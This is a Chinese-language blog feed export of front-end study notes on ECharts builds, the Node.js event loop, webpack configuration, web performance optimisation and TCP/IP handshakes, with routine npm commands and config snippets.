    <content type="text"><![CDATA[获取ECharts npm install echarts –save 自定义构建ECharts我选用的是常用版的echarts/dist/echarts.common.js在我的项目根目录下myProject新建echarts.common.js，然后将echarts.common.js压缩到lib下的压缩文件echarts.common.min.js时遇到一点问题首先是各种包没有安装，就依次安装就好其次是出现如下错误： TypeError: uglifyPlugin is not a function 我采用的是安装webpack，可能需要打包工具，然后是rollup-plugin-uglify版本太高，重新安装rollup-plugin-uglify@3.0.0，再重新安装就可以了]]></content>
      <categories>
        <category>前端 ECharts</category>
      </categories>
      <tags>
        <tag>ECharts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node基础]]></title>
    <url>%2F2018%2F08%2F17%2Fnode%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[node的基本概念node能够解决什么问题？ node的首要目标是提供一种简单的，用于创建高性能的服务器的开发工具 web服务器的瓶颈在于并发的用户量，对比Java和PHP的实现方式 node是什么？ node.js是一个基于Chrome V8引擎的JavaScript运行环境，让JavaScript的执行效率与低端的C语言的相近的执行效率 node.js使用了一个事件驱动、非阻塞式I/O的模型，使其轻量又高效 node.js的包管理器npm，是全球最大的开源生态系统 node的特点为什么JavaScript是单线程的 这是由JavaScript这门脚本语言的用途决定的 Web Worker并没用改变JavaScript单线程的本质 浏览器模型 用户界面包括地址栏、前进/后退按钮、书签菜单等 浏览器引擎-在用户界面和呈现引擎之间传送指令 呈现引擎-又称渲染引擎，也被称为浏览器内核，在线程方面又称为UI线程 网络-用于网络调用，比如http请求 用户界面后端-用于绘制基本的窗口小部件，UI线程和JS共用一个线程 JavaScript解释器-用于解析和执行JavaScript代码 数据存储-这是持久层。浏览器需要在硬盘上保存各种数据，例如Cookie Webworker 是多线程的 完全受主线程控制 不能操作DOM 除JS线程和UI线程之外的其他线程任务队列Event Loop(事件循环)123456789101112131415function read()&#123; console.log(1); setTimeout(function()&#123; console.log(2); setTimeout(function()&#123; console.log(4); &#125;,1000) &#125;,1000);//放到事件队列里 setTimeout(function()&#123; console.log(5); &#125;,1000) console.log(3);&#125;read();//依次打印1 3 2 5 4//JS引擎会先执行栈中的任务，再执行回调队列中的回调事件（先进先出） 1234567891011121314151617function next()&#123;console.log(1);setTimrout(function()&#123;console.log(2);&#125;);//nextTick是把这个回调函数当在当前执行栈的尾部process.nextTick(function()&#123;console.log(3);process.nextTick(function()&#123;console.log(4);process.nextTick(function()&#123;console.log(5);&#125;)// 1 3 4 5 2 &#125;)&#125;)&#125;next();//1 3 4 5 2 node.js中的Event Loop V8引擎解析JavaScript脚本 解析后的代码，调用node API libuv库负责node API的执行，它将不同的任务分配给不同的线程，形成一个Event Loop(事件环)，以异步的方式将任务的执行结果返回给V8引擎 V8引擎再将结果返回给用户 同步与异步同步和异步关注的是消息通知机制 同步就是发出调用后，没有得到结果之前，该调用不返回，一旦返回，就得到返回值了，简而言之就是调用者主动等待这个调用的结果 异步则相反，调用者在发出后这个调用就直接返回了，所以没有返回结果。换句话说当一个异步过程调用发出后，调用者不会立刻得到结果，而是调用发出后，被调用者通过状态、通知或回调函数处理这个调用。 阻塞与非阻塞阻塞和非阻塞关注的是等待结果时的状态 阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。 非阻塞调用指在不能立刻得到结果之前，该调用不会阻塞当前线程。 同步异步与阻塞非阻塞的区别同步异步取决于被调用者，阻塞非阻塞取决于调用者被调用者决定的是同步还是异步调用者决定是阻塞还是非阻塞调用者在等待的过程中不干别的，那就是调用者被阻塞了调用者在等待的过程中干别的，那就是调用者不被阻塞 同异步与阻塞非阻塞的组合关系 同步阻塞 被调用者立即告诉调用者是同步的，这个等待过程中调用者不干别的，就是调用者被阻塞了。 同步非阻塞 被调用者立即告诉调用者是同步的，这个等待过程中调用者接着干其他的，主线程不受干扰，就是调用者不被阻塞。 异步阻塞 被调用者是异步的，但是这个等待过程中调用者不干别的，就调用者被阻塞了。这是异步阻塞 异步非阻塞 被调用者是异步的，这个等待的过程中调用者接着干其他的事情，主线程不受干扰，调用者不被阻塞，这就是异步非阻塞。 什么场景下应该考虑使用node框架当应用程序需要处理大量并发的输入输出，而在向客户端响应之前，应用程序并不需要进行非常复杂的处理。 聊天服务器 电子商务网站]]></content>
      <categories>
        <category>node</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack基础]]></title>
    <url>%2F2018%2F08%2F17%2Fwebpack%2F</url>
    <content type="text"><![CDATA[什么是webpack?WebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其打包为合适的格式以供浏览器使用。 构建就是把源代码转换成发布到线上的可执行 JavaScrip、CSS、HTML 代码，包括如下内容。 代码转换: TypeScript 编译成 JavaScript、SCSS 编译成 CSS 等。 文件优化: 压缩 JavaScript、CSS、HTML 代码，压缩合并图片等。 代码分割: 提取多个页面的公共代码、提取首屏不需要执行部分的代码让其异步加载。 模块合并: 在采用模块化的项目里会有很多个模块和文件，需要构建功能把模块分类合并成一个文件。 自动刷新: 监听本地源代码的变化，自动重新构建、刷新浏览器。 代码校验: 在代码被提交到仓库前需要校验代码是否符合规范，以及单元测试是否通过。 自动发布: 更新完代码后，自动构建出线上发布代码并传输给发布系统。 构建其实是工程化、自动化思想在前端开发中的体现，把一系列流程用代码去实现，让代码自动化地执行这一系列复杂的流程。 构建给前端开发注入了更大的活力，解放了我们的生产力。 初始化项目123mkdir webpack-publiccd webpack-publicnpm init -y 以上三条命令分别是：创建文件夹并命名为webpack-public，将文件夹添加进路径中，初始化npm。 注意：在创建文件夹的时候，名字不能是webpack，否在在安装webpack的时候会报错。 错误信息： npm ERR! code ENOSELFnpm ERR! Refusing to install package with name “webpack” under a packagenpm ERR! also called “webpack”. Did you name your project the samenpm ERR! as the dependency you’re installing?npm ERR!npm ERR! For more information, see:npm ERR! https://docs.npmjs.com/cli/install#limitations-of-npms-install-algorithm webpack核心知识webpack的核心概念 Entry:入口，Webpack 执行构建的第一步将从 Entry 开始，可抽象成输入。 Module：模块，在 Webpack 里一切皆模块，一个模块对应着一个文件。Webpack 会从配置的 Entry 开始递归找出所有依赖的模块。 Chunk：代码块，一个 Chunk 由多个模块组合而成，用于代码合并与分割。 Loader：模块转换器，用于把模块原内容按照需求转换成新内容。 Plugin：扩展插件，在 Webpack 构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要的事情。 Output：输出结果，在 Webpack 经过一系列处理并得出最终想要的代码后输出结果。 Webpack 启动后会从Entry里配置的Module开始递归解析 Entry 依赖的所有 Module。 每找到一个 Module， 就会根据配置的Loader去找出对应的转换规则，对 Module 进行转换后，再解析出当前 Module 依赖的 Module。 这些模块会以 Entry 为单位进行分组，一个 Entry 和其所有依赖的 Module 被分到一个组也就是一个 Chunk。最后 Webpack 会把所有 Chunk 转换成文件输出。 在整个流程中 Webpack 会在恰当的时机执行 Plugin 里定义的逻辑。 配置webpack npm install webpack webpack-cli -D 在开发环境中安装webpack webpack-cli 创建src目录 mkdir src 创建dist目录 mkdir dist 基本配置文件创建dist目录下的index.html12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="root"&gt;&lt;/div&gt; &lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 配置文件webpack.config.js entry：配置入口文件的地址 output：配置出口文件的地址 module：配置模块,主要用来配置不同文件的加载器 plugins：配置插件 devServer：配置开发服务器 1234567891011const path=require('path');module.exports=&#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname,'dist'), filename:'bundle.js' &#125;, module: &#123;&#125;, plugins: [], devServer: &#123;&#125;&#125; 配置开发服务器 npm install webpack-dev-server -D 尽量不要简写install为i,有可能会报这个错误 12345npm ERR! code EINVALIDTAGNAMEnpm ERR! Invalid tag name "–D": Tags may not have any characters that encodeURIComponent encodes.npm ERR! A complete log of this run can be found in:npm ERR! C:\Users\User\AppData\Roaming\npm-cache\_logs\2018-08-17T03_07_44_727Z-debug.log 在webpack.config.js文件中，找到devServer添加如下内容 123456devServer: &#123; contentBase: path.resolve(__dirname, 'dist'), host: 'localhost', compress: true, port: 8080 &#125; contentBase:配置开发服务运行时的文件根目录 host：开发服务器监听的主机地址 compress: 开发服务器是否启动gzip等压缩 port：开发服务器监听的端口在pack.json中找到scripts添加如下内容 1234"scripts": &#123; "build": "webpack --mode development", "dev": "webpack-dev-server --open --mode development " &#125; 支持加载CSS文件什么是Loader通过使用不同的loader，Webpack可以把不同的文件都转成js文件。比如CSS、ES6/7、JSX等 test：匹配处理文件的扩展名的正则表达式 use：loader名称，就是你要使用模块的名称 include/exclude:手动指定必须处理的文件夹或屏蔽不需要处理的文件夹 query：为loaders提供额外的设置选项 loader的三种写法loader加载CSS文件，CSS文件有可能在node_modules里，比如bootstrap、antd 12345678module: &#123; rules: [ &#123; test: /\.css/, loader:['style-loader','css-loader'] &#125; ] &#125; use12345678module: &#123; rules: [ &#123; test: /\.css/, use:['style-loader','css-loader'] &#125; ] &#125;, use+loader123456789101112131415module: &#123; rules: [ &#123; test: /\.css/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: 'style-loader', options: &#123; insertAt:'top' &#125; &#125;,'css-loader'] &#125; ] &#125; 插件 在 webpack的构建流程中，plugin用于处理更多其他的一些构建任务 模块代码转换的工作由 loader 来处理 除此之外的其他任何工作都可以交由 plugin 来完成 自动产出html安装插件自动产出HTML文件，并在里面引入产出后的资源 npm install html-webpack-plugin -D ps:如果报一下错误 123npm ERR! code EAI_AGAINnpm ERR! errno EAI_AGAINnpm ERR! request to https://registry.npmjs.org/html-webpack-plugin failed, reason: getaddrinfo EAI_AGAIN registry.npmjs.org registry.npmjs.org:443 则可以通过以下方法进行解决：切换淘宝镜像 通过config命令 npm config set registry https://registry.npm.taobao.org npm info underscore （如果上面配置正确这个命令会有字符串response） 命令行指定 npm –registry https://registry.npm.taobao.org info underscore 执行完成之后，再执行以上命令就可以了，亲测有效 配置webpack.config.js下的plugins123456789plugins: [ new HtmlWebpackPlugin(&#123; minify: &#123; removeAttributeQuotes:true &#125;, hash: true, template: './src/index.html', filename:'index.html'&#125;)] minify是对html文件进行压缩，removeAttrubuteQuotes是去掉属性的双引号 hash 引入产出资源的时候加上查询参数，值为哈希避免缓存 template 模版路径 支持图片手动添加图片 npm install file-loader url-loader -D file-loader 解决CSS等文件中的引入图片路径问题 url-loader 当图片小于limit的时候会把图片BASE64编码，大于limit参数的时候还是使用file-loader 进行拷贝 JS中引入图片JS1234let logo=require('./images/logo.png');let img=new Image();img.src=logo;document.body.appendChild(img); 配置webpack.config.js123456789&#123; test:/\.(jpg|png|bmp|gif|svg|ttf|woff|woff2|eot)/, use:[ &#123; loader:'url-loader', options:&#123;limit:4096&#125; &#125; ]&#125; 在CSS中引入图片CSS123456.logo&#123; width:355px; height:133px; background-image: url(./images/logo.png); background-size: cover;&#125; HTML1&lt;div class="logo"&gt;&lt;/div&gt; 分离CSS因为CSS的下载和JS可以并行，当一个HTML文件很大的时候，我们可以把CSS单独提取出来加载 mini-css-extract-plugin filename 打包入口文件 chunkFilename用来打包import(‘module’)方法中引入的模块 安装依赖模块 npm install –save-dev mini-css-extract-plugin 配置webpack.config.js123456789101112131415plugins: [ //参数类似于webpackOptions.output new MiniCssExtractPlugin(&#123; filename: '[name].css', chunkFilename:'[id].css' &#125;),&#123; test: /\.css/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader &#125;,'css-loader']&#125; 压缩CSS和JS uglifyjs-webpack-plugin optimize-css-assets-webpack-plugin 安装依赖 npm install uglifyjs-webpack-plugin -Dnpm install optimize-css-assets-webpack-plugin -D 123456789101112const UglifyJSplugin=require('uglifyjs-webpack-plugin');+ const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin');optimization: &#123; minimizer: [ new UglifyJSplugin(&#123; cache: true,//启用缓存 parallel: true,// 使用多进程运行改进编译速度 sourceMap:true//生成sourceMap映射文件 &#125;), new OptimizeCssAssetsWebpackPlugin(&#123;&#125;) ] &#125; CSS和image存放单独目录 outputPath 输出路径 publicPath指定的是构建后在html里的路径 123456789101112131415161718192021222324output: &#123; path: path.resolve(__dirname,'dist'), filename: 'bundle.js', publicPath:'/' &#125;,&#123; test:/\.(jpg|jpeg|png|bmp|gif|svg|ttf|woff|woff2|eot)/, use:[ &#123; loader:'url-loader', options:&#123; limit: 4096, outputPath: 'images', publicPath:'/images' &#125; &#125; ]&#125;plugins: [ new MiniCssExtractPlugin(&#123; filename: 'css/[name].css', chunkFilename:'css/[id].css' &#125;), 在HTML中使用图片 npm install html-withimg-loader -D index.html文件中 在webpack.config.js文件中添加如下配置1234&#123; test: /\.(html|htm)$/, use: 'html-withimg-loader'&#125; 编译less和sass安装less npm install less less-loader -Dnpm install node-saas sass-loader -D 如果在安装sass中出现如下错误 12npm ERR! code E404npm ERR! 404 Not Found: node-saas@latest 可以尝试一下操作我切换到了cnpm上安装就可以了，我也不明白什么原因 写样式less1234@color:orange;.less-container&#123; color:@color;&#125; sass1234$color:green;.sass-container&#123; color:green;&#125; wepack.config.js12345678910111213141516&#123; test: /\.less/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader, &#125;,'css-loader','less-loader'] &#125;, &#123; test: /\.scss/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader, &#125;,'css-loader','sass-loader']&#125;, 处理CSS3属性前缀为了浏览器的兼容性，有时候我们必须要加入浏览器内核的前缀。目前主流浏览器的内核如下 Trident内核：主要代表为IE浏览器, 前缀为-ms Gecko内核：主要代表为Firefox, 前缀为-moz Presto内核：主要代表为Opera, 前缀为-o Webkit内核：产要代表为Chrome和Safari, 前缀为-webkit 安装依赖 npm install postcss-loader autoprefixer -D postcss-loader index.css123::placeholder &#123; color: red;&#125; 配置webpack.config.css123module.exports=&#123; plugins:[require('autoprefixer')]&#125; 配置webpack.config.js123456&#123; test:/\.css$/, use:[MiniCssExtractPlugin.loader,'css-loader','postcss-loader'], include:path.join(__dirname,'./src'), exclude:/node_modules/&#125; 转义ES6/ES7/JSXBabel其实死一个编译JavaScript的平台，可以把ES6/ES7,React的JSX转义为ES5 安装依赖 npm install babel-core babel-loader babel-preset-env babel-preset-stage-0 babel-preset-react babel-plugin-transform-decorators-legacy -D 报错:123456npm ERR! code ENOENTnpm ERR! errno -4058npm ERR! syscall accessnpm ERR! enoent ENOENT: no such file or directory, access npm ERR! enoent This is related to npm not being able to find a file.npm ERR! enoent 尝试解决办法，切换cnpm安装，我成功了 decorator1234567891011//Option+Shift+Afunction readonly(target,key,discriptor) &#123; discriptor.writable=false;&#125;class Person&#123; @readonly PI=3.14;&#125;let p1=new Person();p1.PI=3.15;console.log(p1) 配置jsconfig.json12345&#123; "compilerOptions": &#123; "experimentalDecorators": true &#125;&#125; webpack.config.js123456789101112&#123; test: /\.jsx?$/, use: &#123; loader: 'babel-loader', options: &#123; presets: ["env","stage-0","react"], plugins:["transform-decorators-legacy"] &#125; &#125;, include: path.join(__dirname,'src'), exclude:/node_modules/&#125; 如何调试打包后的代码webpack通过配置可以自动给我们source maps文件，map文件是一种对应编译文件和源文件的方法 source-map 把映射文件生成到单独的文件，最完整最慢 cheap-module-source-map 在一个单独的文件中产生一个不带列映射的Map eval-source-map使用eval打包源文件模块,在同一个文件中生成完整sourcemap cheap-module-eval-source-map sourcemap和打包后的JS同行显示，没有映射列 devtool:’eval-source-map’ 打包第三方类库]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端开发常用的优化技巧汇总]]></title>
    <url>%2F2018%2F08%2F15%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[对于一个前端工程师，不仅要写好代码，还要考虑到性能方面的优化问题，那么我们可以从哪些方面进行性能的优化？首先，我们先来看看“雅虎军规”的35条： “雅虎军规”35条 尽量减少 HTTP 请求个数——须权衡 使用 CDN（内容分发网络） 为文件头指定 Expires 或 Cache-Control ，使内容具有缓存性。 避免空的 src 和 href 使用 gzip 压缩内容 把 CSS 放到顶部 把 JS 放到底部 避免使用 CSS 表达式 将 CSS 和 JS 放到外部文件中 减少 DNS 查找次数 精简 CSS 和 JS 避免跳转 剔除重复的 JS 和 CSS 配置 ETags 使 AJAX 可缓存 尽早刷新输出缓冲 使用 GET 来完成 AJAX 请求 延迟加载 预加载 减少 DOM 元素个数 根据域名划分页面内容 尽量减少 iframe 的个数 避免 404 减少 Cookie 的大小 使用无 cookie 的域 减少 DOM 访问 开发智能事件处理程序 用 代替 @import 避免使用滤镜 优化图像 优化 CSS Spirite 不要在 HTML 中缩放图像——须权衡 favicon.ico要小而且可缓存 保持单个内容小于25K 打包组件成复合文本 在性能优化方面，我们可以从三个方面来考虑 减少http请求的次数或者减少请求数据的大小页面中每发送一次HTTP请求，都需要完成请求+响应这个完整的HTTP事务,会消耗一些时间，也可能会导致HTTP连接通道阻塞，为了提高页面加载速度和运行的性能，我们应该减少HTTP的请求次数和减少请求内容的大小(请求的内容越大，消耗的时间越长) 1.采用CSS雪碧图技术(CSS Sprit/CSS图片精灵)技术，把一些小图合并在一张大图上,使用的时候通过背景图片定位,定位到具体的某一张小图上123456789.pubBg&#123; background:url('../img/sprit.png') no-repeat; background-size:x y /*=&gt;和原图大小保持一致的;*/&#125;.box&#123; background-position:x y;/*通过背景定位,定位到具体的位置，展示不同的图片即可*/&#125;....&lt;div class = 'pubBg box'&gt;&lt;/div&gt; 2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度； 1)CSS合并成一个，JS最好也合并成一个 2)首先通过一些工具(例如：webpack)把合并后的CSS或者JS压缩成xxx.min.js，减少文件大小 3)服务器端开启资源文件的GZIP压缩… 通过一些自动化工具完成CSS以及JS的合并压缩，或者再完成LESS转CSS，ES6转ES5等操作，我们把这种自动化构建模式，称之为前端&quot;工程化&quot;开发 3、采用图片懒加载技术，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片(核心目是：减少页面首次加载HTTP请求的次数)真实项目中，我们开始图片都不加载，页面首次加载完成，先把第一屏中可以看见的图片进行加载，随着页面滚动，再把下面区域中能够呈现出来的图片进行加载 根据图片懒加载技术，我们还可以扩充出,数据的懒加载 1)开始加载页面的时候，我们只把首屏或者前两屏的数据从服务器端进行请求(有些网站首屏数据是后端渲染好，整体返回给客户端呈现的) 2)当页面下拉，滚动到哪个区域，再把这个区域需要的数据进行请求(请求回来做数据绑定以及图片延迟加载) 3)分页展示技术采用的也是数据的懒加载思想实现的：如果我们请求获取的数据是很多的数据，我们最好分批请求，开始只请求第一页的数据，当用户点击第二页(微博是下拉到一定的距离之后，再请求第二页数据…)的时候再请求第二页的数据… 4、对于不经常更新的数据，最好使用浏览器的304缓存做处理(主要由服务器端处理) 例如： 第一次请求CSS和JS下来，浏览器会把请求的内容缓存在了，如果做了304处理，用户再次请求CSS和JS，直接从缓存中读取，不需要再去服务器获取了(减少了HTTP请求次数)当用户强制刷新页面(CTRL+F5)或者当前缓存的CSS或JS发生了变动，都会重新的服务器端拉取 … 对于客户端来讲，我们还可以基于localStorage来做一些本地存储，例如：第一次请求的数据或者不经常更新的CSS和JS，我们都可以把内容存储在本地，下一次页面加载，我们从本地中获取即可，我们设定一定的期限或者一些标识，可以控制在某个阶段重新从服务器获取 5、使用字体图标代替一些页面中的位图(图片)，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数(类似于图片雪碧图)6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的preload=none;页面加载的时候，音视频资源不进行加载，播放的时候再开始加载(减少页面首次加载HTTP请求的次数) preload=auto;页面首次加载的时候就把音视频资源进行加载了 preload=metadata;页面首次加载的时候只把音视频资源的头部信息进行加载 7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输[优势]1）JSON格式的数据，能够清晰明了的展示出数据结构，而且也方便我们获取和操作2）相对于很早以前的XML格式传输，JSON格式的数据更加轻量级3）客户端和服务器端都支持JSON格式数据的处理，处理起来非常的方便真实项目中，并不是所有的数据都要基于JSON，我们尽可能这样做，但是对于某些特殊需求(例如：文件流的传输或者文档流的传输)，使用JSON就不合适了 8、采用CDN加速 CDN： 分布式(地域分布式)[很烧钱] 本质上：真正的性能优化是由硬件做依托的 关于编写代码时候的一些优化技巧除了减少HTTP请求次数和减少请求数据的大小可以优化性能，我们在编写代码的时候，也可以进行一些优化，让页面的性能有所提升(有些不好的代码编写习惯，会导致页面性能消耗太大，例如：内存泄露) 1、在编写JS代码的时候，尽量减少对DOM的操作(VUE和react框架在这方面处理的非常不错)在JS中操作DOM是一个非常消耗性能的事情，但是我们又不可避免的操作DOM，我们只能尽量减少对它的操作 [操作DOM的弊端] 1)DOM存在映射机制(JS中的DOM元素对象和页面中的DOM结构是存在映射机制的，一改则都改)，这种映射机制，是浏览器按照W3C标准完成对JS语言的构建和DOM的构建(其实就是构建了一个监听机制)，操作DOM是同时要修改两个地方，相对于一些其他的JS编程来说是消耗性能的 2)页面中的DOM结构改变或者样式改变，会触发浏览器的回流(浏览器会把DOM结构重新进行计算，这个操作很耗性能)和重绘(把一个元素的样式重新渲染) 2、编写代码的时候，更多的使用异步编程 同步编程会导致：上面东西完不成，下面任务也做不了，我们开发的时候，可以把某一区域模块都设置为异步编程，这样只要模块之间没有必然的先后顺序，都可以独立进行加载，不会受到上面模块的堵塞影响(用的不多) 尤其是ajax数据请求，我们一般都要使用异步编程，最好是基于promise设计模式进行管理(项目中经常使用fetch、VUE axios等插件来进行ajax请求处理，因为这些插件中就是基于promise设计模式对ajax进行的封装处理) 3、在真实项目中，我们尽可能避免一次性循环过多数据(因为循环操作是同步编程)，尤其是要避免while导致的死循环操作4、CSS选择器优化 1）尽量减少对标签选择器的使用 2）尽可能少使用ID选择器，多使用样式类选择器(通用性强) 3）减少使用选择器时候前面的前缀，例如：headerBox .nav .left a{}(选择器是从右向左查找的)、在命名的时候做优化。 5、避免使用CSS表达式1234/*CSS表达式*/.box&#123; background-color:expression((new Date()).getHours()%2?'red':'blue');&#125; 6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS(先呈现页面，再给用户提供操作)8、JS中避免使用eval 1）性能消耗大 2）代码压缩后，容易出现代码执行错乱问题 9、JS中尽量减少闭包的使用 1）闭包会形成一个不销毁的栈内存，过多的栈内存累积会影响页面的性能 2）还会容易导致内存的泄露 闭包也有自己的优势：保存和保护，我们只能尽量减少，但是无可避免 10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现事件委托(事件代理) 把事件绑定给外层，当里面的后代元素相关行为被触发，外层容器绑定的方法也会被触发执行(冒泡传播机制导致)，通过事件源是谁，我们做不同的操作即可 11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等13、CSS中减少对滤镜的使用，页面中也减少对flash的使用关于页面SEO优化技巧1、页面中杜绝出现死链接(404页面)，而且对于用户输入一个错误页面，我们要引导到404提示页面中(服务器处理的)2、避免浏览器中异常错误的抛出 尽可能避免代码出错 使用try catch做异常信息的捕获 … 3、增加页面关键词优化]]></content>
      <tags>
        <tag>web前端</tag>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP、http等知识梳理]]></title>
    <url>%2F2018%2F08%2F15%2FTCP-IP%E3%80%81http%E7%AD%89%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[前后端通信先从一道面试题开始：在面试的时候经常被问，当我们在浏览器地址栏中输入一个URL地址,到最后看到页面,中间都经历了哪些事情?我们从客户端和服务器交互模型角度来回答这个问题：假设我们访问的是 https://www.baidu.com/这个地址 ，回车键之后，我们可以看到的百度页面 百度页面并没用在我们自己的客户端本地，我们输入地址之后，才请求过来的 输入不同的域名可以看到不同的页面 有的网址是https:,有的是http(也有ftp) 需要客户端联网才能完成这些事情那这一过程都经历了什么事情呢？ request请求阶段 首先根据客户端输入的域名，到DNS服务器上进行反解析(通过域名找到对应服务器的外网IP) 通过找到的外网IP，找到对应的服务器 通过在地址栏中输入的端口号(没有输入时因为不同协议有自己默认的端口号)找到服务器上发布的对应的项目 response响应阶段 真正的服务器接收到响应，根据你的请求信息，进行资源的整理；并且把相应的资源通过HTTP返给客户端；(html,css，js返回的不是文件) 把从服务器请求过来的数据，资源进行整理；处理成浏览器可识别的文件； 浏览器自主渲染的过程 先把HTML文件进行过滤解析，形成DOM树；节点与节点之间的一个组合 代码从上到下解析，形成CSS树； 把DOM树和css树进行重新组合，形成render树；是真正最后渲染的树； 我们上面说的协议，一般有HTTP、TCP、IP等那协议是什么呢？协议的必要性在哪？ 简单来说，协议就是计算机与计算机之间通过网络通信时，事先达成的一种 “约定”。这种“约定”使不同厂商的设备、不同的CPU以及不同操作系统组成的计算机之间，只要遵循相同的协议就能够实现通信。这就好比一个中国人说汉语一个外国人说英语使用不同的国家语言进行沟通，怎么也无法理解。如果两个人约定好 都说中文或英文，就可以互相沟通通信。协议分为很多种，每一种协议都明确界定了它的行为规范。两台计算机必须能够支持相同的协议，并遵循相同协议进行处理，这样才能实现相互通信。 TCP/IP协议TCP/IP 是用于因特网 (Internet) 的通信协议。 TCP/IP 通信协议是对计算机必须遵守的规则的描述，只有遵守这些规则，计算机之间才能进行通信。 TCP (Transmission Control Protocol)和UDP(User Datagram Protocol)协议属于传输层协议。其中TCP提供IP环境下的数据可靠传输，它提供的服务包括数据流传送、可靠性、有效流控、全双工操作和多路复 用。通过面向连接、端到端和可靠的数据包发送。通俗说，它是事先为所发送的数据开辟出连接好的通道，然后再进行数据发送；而UDP则不为IP提供可靠性、 流控或差错恢复功能。一般来说，TCP对应的是可靠性要求高的应用，而UDP对应的则是可靠性要求低、传输经济的应用。 TCP支持的应用协议主要有：Telnet、FTP、SMTP等； UDP支持的应用层协议主要有：NFS（网络文件系统）、SNMP（简单网络管理协议）、DNS（主域名称系统）、TFTP（通用文件传输协议）等。 TCP/IP协议与低层的数据链路层和物理层无关，这也是TCP/IP的重要特点TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接: 三次握手的过程 第一次握手：客户端发送SYN码数据包发送给服务器，客户端要求和服务器建立连接 第二次握手：服务端接收到联机请求会发送ACK码到客户端，是要建立联机吗？ 第三次握手：客户端接收到服务端的ACK码，验证是否正确，如果正确，则再次发送ACK，建立连接 三次握手之后，客户端和服务端联机成功，可以发送数据 一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，只简单的 描述下这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步 （同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同 步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数 据。 客户端和服务端发送数据是双向的；客户端给服务端传递的是路径、参数，随机的；服务端给客户端传输自己的资源，文件，数据； 四次挥手的过程 1.当客户端发送数据结束，需要发送fin告诉服务器，数据传输结束； 2.服务端返回给客户端一个ACK码，知道客户端数据传输完毕；客户端接收到ACK，就会把发送到服务端的通道进行关闭； 3.服务端数据传输结束之后，也会发送fin给客户端 4.当客户端接收数据完毕之后，会发送ACK给服务端，服务端可以安心关闭传输数据的通道。 当客户A 没有东西要发送时就要释放 A 这边的连接，A会发送一个报文（没有数据），其中 FIN 设置为1, 服务器B收到后会给应用程序一个信，这时A那边的连接已经关闭，即A不再发送信息（但仍可接收信息）。 A收到B的确认后进入等待状态，等待B请求释放连接， B数据发送完成后就向A请求连接释放，也是用FIN=1 表示， 并且用 ack = u+1(如图）， A收到后回复一个确认信息，并进入 TIME_WAIT 状态， 等待 2MSL 时间。 为什么需要等待呢？为了这种情况： B向A发送 FIN = 1 的释放连接请求，但这个报文丢失了， A没有接到不会发送确认信息， B 超时会重传，这时A在 WAIT_TIME 还能够接收到这个请求，这时再回复一个确认就行了。（A收到 FIN = 1 的请求后 WAIT_TIME会重新记时）另外服务器B存在一个保活状态，即如果A突然故障死机了，那B那边的连接资源什么时候能释放呢？ 就是保活时间到了后，B会发送探测信息， 以决定是否释放连接 为什么握手是三次，挥手是四次的呢？ 